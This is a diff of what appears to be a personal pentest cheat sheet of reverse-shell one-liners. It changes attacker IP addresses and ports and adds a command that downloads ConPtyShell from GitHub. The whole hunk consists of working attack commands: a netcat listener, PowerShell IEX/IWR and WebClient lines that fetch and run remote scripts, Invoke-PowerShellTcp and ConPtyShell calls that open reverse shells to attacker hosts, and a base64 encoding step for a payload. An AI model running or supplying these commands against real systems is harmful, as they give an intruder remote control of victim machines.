@@ -8,13 +8,14 @@ stty raw -echo; (stty size; cat) | nc -lvnp 4444 # or use
 penelope -l 4444
 
 <<windows>>
-IEX(IWR http://172.16.117.30:4443/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 172.16.117.30 4444 # or
+IEX(IWR http://10.10.14.148/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.148 4443 # or
 IEX(New-object net.webclient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcpOneLine.ps1') # Direct execute. or as powershell
 echo IEX(New-object net.webclient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcpOneLine.ps1') | powershell -noprofile - # Direct run, - is for stdin
 IEX(IWR('http://10.10.15.223/powershel.ps1'))
 cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t utf-16le | base64 -w 0
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 
-powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331
+powershell -c IEX(New-Object NET.WebClient).DownloadString('http://10.10.14.148/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.148 -Port 4443
 
 
 ```
